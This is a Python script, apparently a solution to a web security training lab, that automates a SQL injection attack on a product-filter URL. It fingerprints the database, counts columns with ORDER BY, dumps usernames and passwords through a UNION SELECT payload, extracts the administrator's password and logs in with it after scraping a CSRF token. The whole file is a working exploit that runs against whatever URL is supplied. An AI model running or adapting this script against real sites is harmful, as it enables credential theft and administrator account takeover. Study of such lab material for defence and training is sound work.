import sys
import urllib3
import requests
from bs4 import BeautifulSoup
import re

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http':'http://127.0.0.1:8080','https':'http://127.0.0.1:8080'}

def find_no_of_column(url):
    uri = '/filter?category=Pets'
    for i in range(1,10):
        payload = "'order+by+%s--"%i
        r = requests.get(url+uri+payload, verify = False, proxies = proxies)
        if r.status_code != 200:
            return i-1
    else:
        return False

def extract_password(s, url):
    path = '/filter?category=Pets'
    payload = "'+UNION+SELECT+NULL,username||'*'||password+from+users--"
    r = requests.get(url+path+payload, verify = False, proxies = proxies)
    if r.status_code == 200:
        password = re.search(r'administrator\*(\w+)', r.text).group(1)
        print("(+) Password of administator is %s" %password)
    return password


def get_csrf_token(s, url):
    path = '/login'
    r = s.get(url+path, verify = False, proxies = proxies)
    soup = BeautifulSoup(r.text, 'html.parser')
    csrf = soup.find("input")['value']
    return csrf

def exploit_sql_injection(s, url):
    path = '/filter?category=Pets'
    login = '/login'
    payload = "'+UNION+SELECT+NULL,NULL--"
    r = s.get(url+path+payload, verify = False, proxies = proxies)
    if r.status_code == 200:
        print("(+) sql injection confirmed")
    else:
        print("(-) sql injection failed")
    password = extract_password(s, url)
    csrf = get_csrf_token(s, url)
    data = {'csrf':csrf, 'username':'administrator', 'password':password}
    res = s.post(url+login, data=data, verify=False, proxies=proxies)
    if 'administrator' in res.text:
        print("(+) SQL Injection successful.")
        print("(+) you got administrator access")
    else:
        print("(+) SQL Injection failed.")

def find_sql_types(url):
    dict = {'Microsoft':'@@version', 'PostgreSQL':'version()', 'MySQL':'@@version'}
    for k,v in dict.items():
        uri = '/filter?category=Pets'
        payload = f"'+UNION+SELECT+NULL,{v}--"
        res = requests.get(url+uri+payload, verify=False,proxies=proxies)
        if res.status_code == 200:
            print("(+) %s query found"%k)
        else:
            pass
    
        



if __name__ == '__main__':
    try:
        url = sys.argv[1]
    except IndexError:
        print("Usage: python %s <url>" %sys.argv[0])
        print("Example: python %s example.com" %sys.argv[0])
        sys.exit(-1)
    find_sql_types(url)
    number = find_no_of_column(url)
    print("(+) number of columns : %s" %number)
    s = requests.session()
    exploit_sql_injection(s, url)
    

